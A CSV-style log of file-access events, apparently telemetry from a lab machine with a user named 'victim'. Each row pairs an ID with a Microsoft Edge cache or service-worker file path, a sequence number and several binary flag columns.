ce710ac5-1a0d-4a23-9410-7009b87df400,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\wscui.cpl'},291,False,1,0,1,1,0,1
58837247-b31d-4902-a6f2-e6bfc3c332fe,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0'},400,False,1,0,1,1,0,1
82c664e0-1147-454d-9042-21b9048d3095,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1'},402,False,1,0,1,1,0,1
f0798615-4d79-4c83-8718-d4e8e5824050,{'file': '1:WofCompressedDat'},403,False,1,0,1,1,0,1
2a0e113a-f75a-4e20-bbe0-2f76615e9eca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000017'},404,False,1,0,1,1,0,1
bdc8b87d-7dd4-4e34-b5b7-24cae668e387,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a9'},405,False,1,0,1,1,0,1
0d52db09-cfa7-4d76-8333-3a1f2485869a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\f1cdccba37924bda_0'},406,False,1,0,1,1,0,1
555f12d7-2481-417a-a1e6-60493912ecae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\f1cdccba37924bda_1'},407,False,1,0,1,1,0,1
62118519-7913-41b5-b978-9bac1b0f7291,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e73519daf6970a86_0'},408,False,1,0,1,1,0,1
e6e9b151-99ee-4d2c-a51f-b85498e1ebed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e73519daf6970a86_1'},409,False,1,0,1,1,0,1
8e188d0d-6517-439b-ad80-2d202fc7e92f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000aa'},410,False,1,0,1,1,0,1
40573688-37b2-457a-bbd2-f0bcb5ad6103,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0d1f4537dea09ba2_0'},411,False,1,0,1,1,0,1
0a0493a3-aa66-416f-a3df-9cfbc33f6344,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0d1f4537dea09ba2_1'},412,False,1,0,1,1,0,1
bafb5d44-f4d2-44ac-bebf-9223aece8824,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40d0c138bab9b8ee_0'},413,False,1,0,1,1,0,1
6d0703c1-9b91-4850-8a54-0b24fbfa293b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40d0c138bab9b8ee_1'},414,False,1,0,1,1,0,1
f7fbbe87-0fd4-45e8-adf8-4366c38b3271,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ab'},415,False,1,0,1,1,0,1
b216f84c-7b00-4c34-9678-d65b65c3213b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e884b832e0c12be1_0'},416,False,1,0,1,1,0,1
e64aa06b-575b-4813-adec-013df2cd42d5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e884b832e0c12be1_1'},417,False,1,0,1,1,0,1
8fa939a9-17c9-4f8e-99d4-e0b0b7e12c97,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\517c6c0e0da520ae_0'},418,False,1,0,1,1,0,1
ef2434a0-ecaf-48e7-a12b-ec355b86593a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\517c6c0e0da520ae_1'},419,False,1,0,1,1,0,1
cb38b9f9-8df5-4f27-827a-30f3eb7cbfb4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\33e76e10a157b64f_0'},420,False,1,0,1,1,0,1
4d0caa4e-99a1-48e1-a8d7-66f635fa3a21,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\33e76e10a157b64f_1'},421,False,1,0,1,1,0,1
d9dd00be-9142-4ba0-b5b0-fd143b8fe500,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\486826d9e44ad68d_0'},422,False,1,0,1,1,0,1
461a9f8c-7b5c-44cf-96a4-f5131e60925b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\486826d9e44ad68d_1'},423,False,1,0,1,1,0,1
c76be129-a23f-47d3-a9d4-93e45197e81a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ac'},424,False,1,0,1,1,0,1
76b390be-710e-4467-8eee-a039d1eddfbd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e8fadf2f2f42477f_0'},425,False,1,0,1,1,0,1
3f360bcc-0dad-4b1c-b8d9-27e8958cddce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e8fadf2f2f42477f_1'},426,False,1,0,1,1,0,1
e2d4ada6-47a2-42b4-a998-f53700e47ce1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d21af9d64e4d739f_0'},427,False,1,0,1,1,0,1
bcba4a8f-7647-4833-84b2-dc722a6cc0a8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d21af9d64e4d739f_1'},428,False,1,0,1,1,0,1
40d7d68d-7b63-4ead-a61d-e949bb1522b1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\43efb30f58a26e55_0'},429,False,1,0,1,1,0,1
add1ccbb-2ee8-4684-8244-01052fcdacea,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\43efb30f58a26e55_1'},430,False,1,0,1,1,0,1
4bd5b185-c91d-49e5-98c1-23e38a824631,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ad'},431,False,1,0,1,1,0,1
e31b2317-1504-46a7-9c87-fb3565e71711,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\41678a5fcfd8fb1d_0'},432,False,1,0,1,1,0,1
06c41693-6fce-4268-871d-fba74782b04a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\41678a5fcfd8fb1d_1'},433,False,1,0,1,1,0,1
790f19f2-2c78-4561-8db3-5c93a2d41c01,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0f9209db3ff30066_0'},434,False,1,0,1,1,0,1
46a305bf-cdd6-4620-bce9-e8603ced3507,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0f9209db3ff30066_1'},435,False,1,0,1,1,0,1
5c149c46-3306-4ae6-be21-14f7b8a8b15d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ae'},436,False,1,0,1,1,0,1
8afb9b7f-a4a6-40fd-8bac-bcbc6c82799d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7569a12fd66c47cf_0'},437,False,1,0,1,1,0,1
6ce8359b-95a6-457a-914a-90443950f5aa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7569a12fd66c47cf_1'},438,False,1,0,1,1,0,1
8a03368e-d2a5-4214-adf6-59d9ee5bc03b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000af'},439,False,1,0,1,1,0,1
fd40592f-ae71-49d8-bfa2-cbd4a604b397,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0ba94dde998af4fa_0'},440,False,1,0,1,1,0,1
bcd4172e-634e-4f1e-a3df-35c2939ba475,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0ba94dde998af4fa_1'},441,False,1,0,1,1,0,1
ce26ad61-4ada-4c2d-acee-57d54c06f918,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab862aae4ab2e1f1_0'},442,False,1,0,1,1,0,1
e723d052-18ef-4c8a-9647-6d7a1be8eb47,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab862aae4ab2e1f1_1'},443,False,1,0,1,1,0,1
e8e3d135-884f-418d-8f7c-c886d3853ee4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b0'},444,False,1,0,1,1,0,1
1a567be9-706f-4a54-adf2-027a443053b3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d13f9a0666db69d2_0'},445,False,1,0,1,1,0,1
54982a3c-5f8c-451c-a639-12b4ef55f3a0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d13f9a0666db69d2_1'},446,False,1,0,1,1,0,1
38ad3e02-8b8b-411b-bd65-7db0fa0c7a6f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\59d11db12add1cd9_0'},447,False,1,0,1,1,0,1
16c21a54-d468-40a0-94fd-fad76ee95f02,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\59d11db12add1cd9_1'},448,False,1,0,1,1,0,1
db9d003c-a2f0-4fb0-ba02-5fd9d35741cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\304898f9e47bf481_0'},449,False,1,0,1,1,0,1
4897a9a1-afea-4671-b294-6327a65c8ae6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\304898f9e47bf481_1'},450,False,1,0,1,1,0,1
74091b66-6439-497c-88ea-62defa238f18,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b1'},451,False,1,0,1,1,0,1
4946780d-7783-41fa-a36b-d3fcbd29b185,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8af98c3f863d97cf_0'},452,False,1,0,1,1,0,1
d453f1db-409e-49c1-8454-1d10a3bb7f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8af98c3f863d97cf_1'},453,False,1,0,1,1,0,1
fc48f0ed-d900-418d-ad9b-cd65ed7d8377,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b2'},454,False,1,0,1,1,0,1
86168435-c3bd-466b-b392-da082d5d71e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e25299455997ba8b_0'},455,False,1,0,1,1,0,1
bcfaa5e0-d71a-4321-aecf-14d43a6b1168,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e25299455997ba8b_1'},456,False,1,0,1,1,0,1
4f3b21de-ef0a-4709-a0cd-faa86bc92d2d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b2368130f130653_0'},457,False,1,0,1,1,0,1
7abda821-9bc0-44e2-b470-b9009e618acd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b2368130f130653_1'},458,False,1,0,1,1,0,1
98c47262-5054-4c79-98a5-4cf7e4375d03,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fbdc8eb591d4753a_0'},459,False,1,0,1,1,0,1
d9d04193-46f1-48ae-969b-7a391e7d0f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fbdc8eb591d4753a_1'},460,False,1,0,1,1,0,1
8011a1ee-6eb6-4322-bc34-70f90e709026,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c702ca4c9e5e5c84_0'},461,False,1,0,1,1,0,1
a5f0dd7c-276e-4efb-aea0-5bb342b2f99f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c702ca4c9e5e5c84_1'},462,False,1,0,1,1,0,1
fb5223fc-9cc7-4f26-9c2d-cd17de7328ed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b3'},463,False,1,0,1,1,0,1
33dc5c89-9e4d-42c5-88d8-aef61b1b6882,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a1d7a065a7e60334_0'},464,False,1,0,1,1,0,1
919fe68e-31f5-4977-bb0e-efe4d4493ddf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a1d7a065a7e60334_1'},465,False,1,0,1,1,0,1
8daa8306-d44f-40c7-aae7-edf4ae576453,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\abc6f936a44c7530_0'},466,False,1,0,1,1,0,1
c60335bf-b0ef-4f56-9bbf-a9c19a4204cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\abc6f936a44c7530_1'},467,False,1,0,1,1,0,1
50a0cc9a-61ed-4358-8029-4ce6363a53c9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b4'},468,False,1,0,1,1,0,1
c5773601-03a9-4925-8ef3-d62401f061f6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d0b548ec66cc0d3f_0'},469,False,1,0,1,1,0,1
becce9f9-0a7c-4cb6-bebc-3ac35ac4d21a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d0b548ec66cc0d3f_1'},470,False,1,0,1,1,0,1
6eb76d2f-5638-4aa8-b960-7d6d54b25255,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ffffbca04fdceec_0'},471,False,1,0,1,1,0,1
b739a568-3f85-4667-9328-0049a4e4a51c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ffffbca04fdceec_1'},472,False,1,0,1,1,0,1
a4b66330-6ca3-4a97-8a44-c6d8af960a79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2cb094917b3288cd_0'},473,False,1,0,1,1,0,1
e13ee146-92e5-454d-9ac5-996cd356e911,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2cb094917b3288cd_1'},474,False,1,0,1,1,0,1
21d7eaed-3c39-4f14-ab9b-285264e1cbb3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ac0fca45321fd75c_0'},475,False,1,0,1,1,0,1
330d160e-3115-46a4-aedc-6d5249d9b2bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ac0fca45321fd75c_1'},476,False,1,0,1,1,0,1
8eb4525c-b93b-4ea3-b710-e26649169317,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\05f9117ade39b35b_0'},477,False,1,0,1,1,0,1
c3a31b13-0d96-48be-ae99-513320515884,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\05f9117ade39b35b_1'},478,False,1,0,1,1,0,1
c4d4503d-7dcb-423b-beb6-bb3988fa99a5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f486e12e583a64a3_0'},479,False,1,0,1,1,0,1
74ae047a-603b-442e-bab6-4104dc6ae157,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f486e12e583a64a3_1'},480,False,1,0,1,1,0,1
7aa98c83-2522-4dfc-b1ed-d0d3d86b2c7c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aab84a2afd7db001_0'},481,False,1,0,1,1,0,1
9125cc7f-9459-44ab-b760-eed979fc4d8e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aab84a2afd7db001_1'},482,False,1,0,1,1,0,1
7db08386-820d-4196-b681-355801b26014,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4791ae0cd91edb21_0'},483,False,1,0,1,1,0,1
3480ad11-2c5b-409c-a7b9-4e712de98cc5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4791ae0cd91edb21_1'},484,False,1,0,1,1,0,1
1a1e4eba-3dac-4bc3-a3d6-f44f4023ee66,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\725351b01813be96_0'},485,False,1,0,1,1,0,1
4f60aae6-d7db-4eff-b291-1b3c846f0474,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\725351b01813be96_1'},486,False,1,0,1,1,0,1
da9fe3e2-949b-4381-8dd8-d7a7eacabc7e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\711e1c98a878ba06_0'},487,False,1,0,1,1,0,1
2ee45ebd-70cb-4cc4-982c-378184bbeeb4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\711e1c98a878ba06_1'},488,False,1,0,1,1,0,1
12729614-a6c8-49da-9e08-b023e589476f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b5'},489,False,1,0,1,1,0,1
75c7dbba-3542-44ef-ac01-ee13eecc662a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ba677b3476b674a1_0'},491,False,1,0,1,1,0,1
f1c446a1-ff89-4c89-bb6e-32902e6de1b3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ba677b3476b674a1_1'},492,False,1,0,1,1,0,1
b762709e-4d38-4981-a3da-6428a02e9a8d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e55fd7ab7991699f_0'},493,False,1,0,1,1,0,1
